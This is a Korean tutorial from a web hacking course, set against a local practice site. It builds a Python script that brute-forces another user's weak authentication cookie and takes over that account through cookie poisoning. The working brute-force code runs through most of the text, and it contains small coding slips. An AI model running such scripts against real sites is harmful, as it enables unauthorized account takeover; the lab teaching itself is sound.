# 6-3_cookie_auth_Hacking : requests.py 를 이용한 Brute Force Attack(무차별대입공격)

<aside>
💡 author : 전재호(agamtt) 2024-01-24
contributor : 손기민(KiminSon) 2024-04-08

</aside>

# 지난번 이야기

- 해커 babo 는 user 쿠키가 사용자 인증에 쓰인다는 것 까지는 추측으로 알아냈습니다.
- 그러나, 랜덤한 값이 뒤에 붙어있으므로, grape 유저의 **랜덤값을 쉽게 추측하지 못합니다.**
- 보안이 향상되었습니다.

해커 babo 는 좌절했습니다.

랜덤한 값을 몰라서 grape 의 계정을 해킹할 수 없습니다.

그러나 해커의 세상에 포기란 없는 말입니다.

새로운 공격 아이디어는 다음과 같습니다.

- babo는 babo 의 user 쿠키의 value 가 babo_6GcT 라는 것을 압니다.
    - 자기 계정이니까, 로그인해서 브라우저의 쿠키를 확인해보면 됩니다.
- grape 의 user 쿠키의 value 는 **아마도 동일한 형태에서 랜덤값만 바뀐 형태**일 것 입니다.
    - grape_XXXX (X는 랜덤한 값) 을 맞추면 됩니다.

이때 본인(babo) 의 XXXX 에 6GcT 가 들어가는걸 봐서는 랜덤한 값에 규칙이 있습니다.

- 알파벳 대소문자를 포함하고 있음
- 숫자도 들어감

그렇다면, 알파벳 대소문자와 숫자를 포함하는 모든 4자리수를 전부 대입해보면, grape 의 계정의 쿠키 값을 맞출 수 있지 않을까요?

컴퓨터공학에서, 가능한 모든 경우의 수를 대입해보는 것을 **Brute Force (무차별대입)** 라고 부릅니다. 

# Buster

버스터(Buster) 는 파괴자, 해체자라는 뜻입니다.

어떤 값을 입력하고, 이것이 답이 맞는지 확인할 수 있을때,

암호나 키를 모두 대입해보면, 시간이 오래 걸리지만 언젠간 암호를 맞출 것 입니다.

(무한 원숭이 정리라고 하죠)

![브리아노의 연구소 - 엉덩국, 레진코믹스](image(1).png)

브리아노의 연구소 - 엉덩국, 레진코믹스

이러한 암호를 부수는 프로그램이나 해킹툴을 보통 Buster 라고 부릅니다.

쿠키 암호를 부수는 쿠키 버스터(Cookie Buster) 해킹툴을 만들어봅시다.

# apple buster

<aside>
⚠️ **깝치기 금지**

어… 나도 재귀 알고리즘으로 짤 수 있으니까 컴공들 딴지 걸지 마십쇼

쉬운 코드를 보여주기 위해 일부러 이렇게 했습니다.

</aside>

### 5글자 전수 생성

아래와 같이 5개로 된 중첩 for 문을 이용하면, 5글자짜리 임의 문자열을 생성하여 출력합니다.

```python
'''
Title:apple_buster.py 
Author:Jaeho Jeon 2024-01-25
'''

characters = 'abcdefghijklmnopqrstuvwxyz'

for c1 in characters:
    for c2 in characters:
        for c3 in characters:
            for c4 in characters:
                for c5 in characters:
                    gen = ''.join([c1, c2, c3, c4, c5])
										print(gen)
```

![Untitled](Untitled%20491.png)

이제 이걸 함수로 만들어서 코드를 짧게 만듭시다.

- checker 함수는 guess 와 answer 을 받아, 답이 맞는지 체크하여 True 혹은 False 를 반환합니다.
    - 암호를 해독하는 것을 Crack 이라고 하니, 맞췄을 때 출력하게 만듭시다.
- buster_5char 는 5개의 문자를 전수조사해서 맞추는 함수입니다.
    - target 에는 목표 문자열(정답)을 넣고, charactors 에는 문자열의 후보를 넣습니다.
    - checker 가 정답을 찾으면 True 가 되고, buster_5char 이 return 되면서 답을 출력하고 코드가 종료됩니다.

```python
'''
Title:apple_buster.py 
Author:Jaeho Jeon 2024-01-25
'''

def checker(guess,answer):
    if(guess==answer):
        print(f"Cracked! : {guess}")
        return True
    else:
        print(f"try : {guess}")
        return False

def buster_5char(target,characters):      
    for c1 in characters:
        for c2 in characters:
            for c3 in characters:
                for c4 in characters:
                    for c5 in characters:
                        gen = ''.join([c1, c2, c3, c4, c5])
                        if(checker(gen,target)):
                            return

buster_5char('apple','abcdefghijklmnopqrstuvwxyz')
```

아래 함수로 답이 apple 인 문자열을 크랙할 수 있습니다.

```python
buster_5char('apple','abcdefghijklmnopqrstuvwxyz')
```

# req_cookie.py

<aside>
💡

웹서버가 아니라 본인 컴퓨터에서 수행해야합니다.
해커는 웹서버에 못 접속한다고!

</aside>

우선 req_cookie.py 를 만들어서, 인증 성공과 실패를 구분할 수 있도록 합니다.

<aside>
💡 잘 모르겠으면 Http Request 를 복습하세요!
[6-1_cookie_auth : Http Request](6-1_cookie_auth%20Http%20Request%209c88c253f7e148e1a49c3a4a00f0d95d.md) 
[6-2_cookie_auth : requests.py](6-2_cookie_auth%20requests%20py%2017d7a96649ba4ec3bc0b93f8415cc614.md)

</aside>

- cookie 를 올바른 값으로 입력하면 page-babo.php 에 접근 가능하므로, response 의 status_code 가 200 일 것 입니다.
- cookie 를 틀린 값으로 입력하면 page-babo.php 에 접근 불가능하므로, response 의 status_code 가 302 일 것 입니다.

babo_bg 가 올바른 인증 쿠키이므로, 아래 코드를 실행하면 200 이 출력됩니다.

```python
'''
Title:req_cookie.py 
Author:Jaeho Jeon 2024-01-25
'''
import requests

url = 'http://localhost:8000/page-babo.php'

cookies = {
    'user':'babo_dg'
}

response = requests.get(url, cookies=cookies,allow_redirects=False)

print(response.status_code)
```

![Untitled](Untitled%20492.png)

일부로 쿠키를 틀리게 입력하면, 리다이렉트가 일어나므로, response 의 status_code 는 302 입니다.

![Untitled](Untitled%20493.png)

내용을 출력해보면 더더욱 확실히 알 수 있습니다.

![Untitled](Untitled%20494.png)

![Untitled](Untitled%20495.png)

이제 이것을 함수로 바꿉니다.

response.status_code 가 200 이면 True 를 return 하도록 합니다.

성공여부를 알 수 있도록 Cracked!!! 도 출력하도록 합니다.

- f-string 을 사용하여, babo_ 가 2자리 랜덤글자 앞에 붙도록 합니다.

```python
import requests

def request_checker(url,random_2char):
    user_value = f"babo_{random_2char}"
    cookies = {
        'user': user_value
    }
    response = requests.get(url, cookies=cookies,allow_redirects=False)
    if(response.status_code==200):
        print(f"Cracked!!! : {user_value}")
        return True
    else:
        print(f"failed : {user_value}")

request_checker(url = 'http://localhost:8000/page-babo.php',random_2char='dg')
```

테스트해보면,

올바른 랜덤문자 2개를 맞추면 Cracked!! 가 출력됩니다.

- 바로 아래에 return 이 있으므로, 함수가 종료됩니다.

![Untitled](Untitled%20496.png)

틀린 문자를 넣으면 failed 가 출력됩니다.

![Untitled](Untitled%20497.png)

이제 모든 준비가 완료되었습니다.

# Cookie_buster.py

<aside>
💡 웹서버가 아니라 본인 컴퓨터에서 수행해야합니다.
해커는 웹서버에 못 접속한다고!

</aside>

<aside>
🥷🏻

apple_buster.py 와 req_cookie.py 를 합쳐서 고양이 웹을 해킹해보겠습니다.

이름하여 cookie_buster.py 하하

</aside>

우선 찾고싶은 랜덤값이 2자이니, buster_5char 에서 for문을 2개로 바꿔서 buster_2char 로 만듭니다.

영문대문자와 숫자도 포함하도록 charactors 변수도 수정합니다.

bd 를 크랙해봅시다.

```python
def checker(guess,answer):
    if(guess==answer):
        print(f"Cracked! : {guess}")
        return True
    else
        print(f"try : {guess}")
        return False

def buster_2char(target,characters):      
    for c1 in characters:
        for c2 in characters:
                gen = ''.join([c1, c2])
                if(checker(gen,target)):
                        return

buster_2char('bg','abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')
```

테스트해봅니다. 마찬가지로 bg 을 Crack 합니다.

![Untitled](Untitled%20498.png)

req_cookie.py 의 request_checker 를 가져와서 합칩시다.

```python
'''
Title:cookie_buster.py 
Author:Jaeho Jeon 2024-01-25
'''
import requests

def request_checker(url,random_2char):
    user_value = f"babo_{random_2char}"
    cookies = {
        'user': user_value
    }
    response = requests.get(url, cookies=cookies,allow_redirects=False)
    if(response.status_code==200):
        print(f"Cracked!!! : {user_value}")
        return True
    else:
        print(f"failed : {user_value}")

def buster_2char(characters):      
    for c1 in characters:
        for c2 in characters:
                gen = ''.join([c1, c2])
                if(request_checker(url = 'http://localhost:8000/page-babo.php',random_2char=gen)):
                    return
                        
buster_2char('abcdefghijklmnopqrstuvwxyz')
```

babo 의 계정에서 잘 작동합니다.

즉, babo 의 개인페이지에 접속할 수 있는 쿠키는 babo_dg 임을 brute force 하여 알아냈습니다.

![Untitled](Untitled%20499.png)

# Cookie brute force 공격

babo 를 grape 로 수정합니다.

![Untitled](Untitled%20500.png)

전체코드

```python
'''
Title:cookie_buster.py 
Author:Jaeho Jeon 2024-01-25
'''

import requests

def request_checker(url,random_2char):
    user_value = f"grape_{random_2char}"
    cookies = {
        'user': user_value
    }
    response = requests.get(url, cookies=cookies,allow_redirects=False)
    if(response.status_code==200):
        print(f"Cracked!!! : {user_value}")
        return True
    else:
        print(f"failed : {user_value}")

def buster_2char(characters):      
    for c1 in characters:
        for c2 in characters:
                gen = ''.join([c1, c2])
                if(request_checker(url = 'http://localhost:8000/page-grape.php',random_2char=gen)):
                    return
                        
buster_2char('abcdefghijklmnopqrstuvwxyz')
```

코드를 실행해서 크랙을 시도합니다.

![Untitled](Untitled%20501.png)

grape 유저의 쿠키값이 grape_bs 임을 알아냈습니다.

이제 Cookie Poisoning 을 이용하여 grape 의 계정을 해킹해봅시다.

# Brute Force to Cookie Poisoning

![Untitled](Untitled%20502.png)

babo 로 우선 로그인 한 후,

쿠키를 조작하고 grape 의 개인 페이지로 접속합니다.

![Untitled](Untitled%20503.png)

이제 이 계정은 제 것이 됐습니다.

![Untitled](Untitled%20504.png)

# 마치며

당연히 랜덤값으로 2글자의 영문 소문자를 쓰면 안됩니다.

6초만에 크랙이 가능합니다.

![Untitled](Untitled%20505.png)

구글을 예로 들면, 딱 봐도 100개가 넘어보이는 알파벳 대소문자 + 숫자의 랜덤 쿠키를 사용합니다.

이런건 10년 안에 크랙할 수 없습니다.

무차별대입(bruteforce) 공격은 다음과 같은 상황에서 유효할 수 있습니다.

- 개발자가 바보라서 짧고 약한 키를 사용하는 경우
- 키에 규칙이 있어서, 무차별대입의 경우의수를 줄일 수 있는 경우
- 슈퍼컴퓨터나 고성능 PC 를 이용해서 빠르게 계산하는 경우 (노트북으로는 불가능합니다)
- 수명이 무한인 원숭이인 경우
    - 구글이 먼저 망하겠지만…

## 참고 : 키에 규칙이 있어서 무차별대입의 경우의수를 줄일 수 있는 경우

<aside>
🙋🏻‍♀️ 보안에 꼭 필요한 키를 규칙에 의해 생성하는 경우가 어디있나요? 억지 아닌가요?

</aside>

<aside>
🥷🏻 놀랍게도, 그런 경우는 실제 세상에 종종 존재한다…

</aside>

![Untitled](Untitled%20506.png)

<aside>
🥷🏻 f”SM{birth6char}!” … 자세한 설명 생략…

</aside>

<aside>
⚠️ **주의** : **실제로 시도하지마라**

감옥가는 수가 있습니다.

![Untitled](Untitled%20507.png)

![Untitled](Untitled%20508.png)

</aside>

# 정리하자면

이 챕터에서는 다음 내용들을 공부했습니다.

- HTTP 는 Method, Header 등을 적어서 브라우저와 서버가 통신하는 규칙이다.
- 브라우저가 아니라 프로그래밍 언어나 직접 만든 프로그램으로 HTTP Request 를 전송할 수 있다.
- Python 등으로 해킹툴을 만들어서, 웹사이트 조건에 맞도록 요청을 보내 해킹 공격을 시도할 수 있다.
- 계정 권한을 탈취하는 대부분의 해킹 공격은 쿠키를 훔치거나 맞춰서 인증을 성공하는 것이 목적이다

계속